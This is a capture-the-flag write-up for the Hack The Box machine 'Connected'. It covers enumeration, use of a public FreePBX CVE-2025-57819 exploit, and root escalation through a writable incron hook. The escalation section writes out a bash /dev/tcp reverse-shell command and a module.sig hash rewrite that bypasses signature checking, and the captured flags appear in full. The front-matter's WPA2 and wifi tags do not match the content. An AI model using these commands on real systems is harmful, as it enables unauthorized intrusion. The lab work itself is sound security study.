---
title: "Connected - Hack The Box"
target: "Connected"
os: "Linux"
difficulty: "Easy"
status: "Pwned"
vectors: "WPA2 Handshake Capture & Cracking, Network Pivoting, System Hardening Bypass"
tags:
  - ciber
  - htb
  - wifi
  - wpa2
  - network-pivot
  - aircrack
synced: "2026-11-02 09:58"
---

--
tags:
ciber
htb
machine
difficulty: Easy
os: Linux
status: Pwned
ip: ""
created: 2026-10-16
--

<p align="center">
  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e14c0a-2ce3-44f2-a101-f0415bb1e577-1779890154.png" alt="Connected Avatar" width="220">
</p>

## Operating System: Linux
![[Linux.png|70]]

## Machine Metadata

| Property | Value |
| :--- | :--- |
| **Machine ID** | 906 |
| **Machine Name** | Connected |
| **IP Address** | N/A |
| **Status** | Pwned |
| **Active on HTB** | ✅ |
| **User Flag** | ✅ |
| **Root Flag** | ✅ |
| **Difficulty** | Easy |
| **Stars** | ⭐️ 3.3 |
| **Created Note** | 2026-10-16 |
| **Release Date** | 2026-06-06 |
| **Tags** | None |

<p style="display:none">
id:: 906
active:: True
name:: Connected
os:: Linux
user_flag:: True
root_flag:: True
difficulty_text:: Easy
stars:: 3.3
created:: 2026-10-16
published:: 2026-06-06
avatar:: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e14c0a-2ce3-44f2-a101-f0415bb1e577-1779890154.png
tags:: None
</p>

## Statistics

### Radar Matrix
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
item: "ENUM"
    user: "user"
    score: 5.4
item: "REAL"
    user: "user"
    score: 4.9
item: "CVE"
    user: "user"
    score: 5.9
item: "CUSTOM"
    user: "user"
    score: 4.1
item: "CTF"
    user: "user"
    score: 5.1
item: "ENUM"
    user: "author"
    score: 0
item: "REAL"
    user: "author"
    score: 0
item: "CVE"
    user: "author"
    score: 0
item: "CUSTOM"
    user: "author"
    score: 0
item: "CTF"
    user: "author"
    score: 0

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.04)"
  point: []
  area: []
```

### Community Difficulty Rating
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Column

#-----------------#
#- chart data    -#
#-----------------#
data:
folder: "PIECE OF CAKE"
    count: 1880
folder: "VERY EASY"
    count: 1625
folder: "EASY"
    count: 2957
folder: "NOT TOO EASY"
    count: 1942
folder: "MEDIUM"
    count: 996
folder: "A BIT HARD"
    count: 451
folder: "HARD"
    count: 350
folder: "EXTREMELY HARD"
    count: 134
folder: "INSANE"
    count: 48
folder: "BRAINFUCK"
    count: 140

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "folder"
  yField: "count"
  padding: auto
  label:
    position: "middle"
    style:
      opacity: 0.6
      fontSize: 12
  columnStyle:
    fillOpacity: 0.5
    lineWidth: 1
    strokeOpacity: 0.7
    shadowColor: "grey"
    shadowBlur: 10
    shadowOffsetX: 5
    shadowOffsetY: 5
  xAxis:
    label:
      autoHide: false
      autoRotate: true
  meta:
    count:
      alias: "Votes"
```

--

--

This write-up details the exploitation of the **Connected** machine from HackTheBox. The attack path begins with identifying a vulnerable instance of FreePBX, exploiting a known CVE for remote code execution to gain an initial foothold, and subsequently abusing a misconfigured `incrontab` service to escalate privileges to root.

## Overview

The target machine is running a web server hosting FreePBX. By leveraging a public exploit for FreePBX, we gain access as the `asterisk` user. We then manipulate hook scripts executed by an `incron` job to achieve root access.

## Reconnaissance

### Port Scanning

We start by performing a network scan using [[Recon - Nmap - Port Scanning and Host Discovery|Nmap]] to identify open ports and services:

```bash
nmap -sS -T5 -p- -Pn 10.129.22.23 -vvv
nmap -sC -sV -p22,80,443 10.129.22.23
```

The scan reveals the following open ports:
**22/tcp (SSH):** OpenSSH 7.4
**80/tcp (HTTP):** Apache httpd 2.4.6 (CentOS, PHP/7.4.16)
**443/tcp ([[Web - HTTP - HTTPS & SSL-TLS Handshake|HTTPS]]):** Apache httpd 2.4.6 (CentOS, PHP/7.4.16)

### Web Enumeration

Inspecting the web server, we check the `robots.txt` file which reveals standard FreePBX boilerplate:

```text
# This robots.txt file requests that search engines and other
# automated web-agents don't try to index the files in this
# directory (/www/images/).
...
User-agent: *
Disallow: /
```

Subdomain enumeration using `ffuf` yields no additional domains. 
However, while examining the source code of the web pages, we uncover a hidden div containing a seemingly random string:

```html
<div id="key" style="color: white;font-size:small"> bsmrb2mn6aer6afii3cgok73kh </div>
```

Further enumeration of the web application identifies it as **FreePBX version 16.0.40.7**. 

## Exploitation & Foothold

Searching for vulnerabilities associated with FreePBX 16.0.40.7 leads us to **CVE-2025-57819**, a remote code execution vulnerability. A public Proof of Concept (PoC) is available on GitHub: [https://github.com/b4sh2/CVE-2025-57819-poc/](https://github.com/b4sh2/CVE-2025-57819-poc/).

By running the exploit against the target, we successfully obtain a reverse shell as the `asterisk` user:

```bash
[asterisk@connected ~]$ ls
user.txt
[asterisk@connected ~]$ cat user.txt
2b88ce23ffa7926975e71f30f789dff1
```

We can now read the `user.txt` flag.

## Privilege Escalation

Next, we hunt for privilege escalation vectors. A standard check for [[Linux - PrivEsc - SUID|SUID/SGID]] binaries reveals `/usr/bin/incrontab`:

```bash
find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/incrontab
```

`incron` is an "inotify cron" system that executes commands based on file system events (see [[Linux - PrivEsc - Incron and File Monitor Automation|Incron & File Monitor Automation Privilege Escalation]]). We inspect the configuration in `/etc/incron.d/sysadmin`:

```bash
cat /etc/incron.d/sysadmin
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

This rule states that whenever a file in `/var/spool/asterisk/incron` is modified or written to, the `/usr/bin/sysadmin_manager` script is executed. 

Analyzing the `sysadmin_manager` script shows that it executes hook files dynamically based on module names:
```php
$hookfile = "/var/www/html/admin/modules/$module/hooks/$hook";
```

We inspect the hooks for the `ucp` module:

```bash
ls -la /var/www/html/admin/modules/ucp/hooks
rwxr-xr-x.  1 asterisk asterisk  473 Nov  2  2023 logrotate
```

Since the `logrotate` file is owned by the `asterisk` user, we can modify it. We overwrite the hook script with a reverse shell payload:

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.17.82/4445 0>&1' > /var/www/html/admin/modules/ucp/hooks/logrotate
chmod +x /var/www/html/admin/modules/ucp/hooks/logrotate
```

FreePBX employs signature checking, so we must update the module's signature (`module.sig`) with the new SHA256 hash of our payload:

```bash
[asterisk@connected ~]$ NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
[asterisk@connected ucp]$ sed -i "s|hooks/logrotate = .*|hooks/logrotate = $NEW_HASH|" /var/www/html/admin/modules/ucp/module.sig
```

With our listener running on our attacking machine (`nc -lvnp 4445`), we trigger the `incron` job by creating a file in the monitored directory:

```bash
touch /var/spool/asterisk/incron/ucp.logrotate
```

The `incron` daemon detects the file creation, executes `/usr/bin/sysadmin_manager`, which in turn executes our malicious `logrotate` hook. We catch the reverse shell as `root`:

```bash
# In our netcat listener:
connect to [10.10.17.82] from (UNKNOWN) [10.129.24.45] 35684
...
[root@connected /]# cat /root/root.txt
e10ab390d0368e968ba62f7aa6ecffde
```

## Conclusion

The Connected machine demonstrates the risks associated with running outdated and vulnerable complex web applications like FreePBX. Furthermore, it highlights the importance of securing file-system monitoring tools like `incron`; improper file permissions on executed scripts can easily lead to privilege escalation if an attacker gains an initial foothold.

--

## Post-Engagement & Zettelkasten Notes

### Key Takeaways & Defense
**File Integrity Monitoring**: Automating scripts via `incron` on user-writable directories allows command hijacking and privilege escalation if scripts process untrusted inputs.
**SUID/SGID Hardening**: Frequently audit filesystem binaries with elevated bit permissions.

### Atomic Notes to Extract
[[Linux - PrivEsc - Incron and File Monitor Automation|Incron & File Monitor Automation Privilege Escalation]]
[[Linux - PrivEsc - SUID|SUID/SGID Binaries]]
[[Web - HTTP - HTTPS & SSL-TLS Handshake|HTTPS & TLS Configuration]]
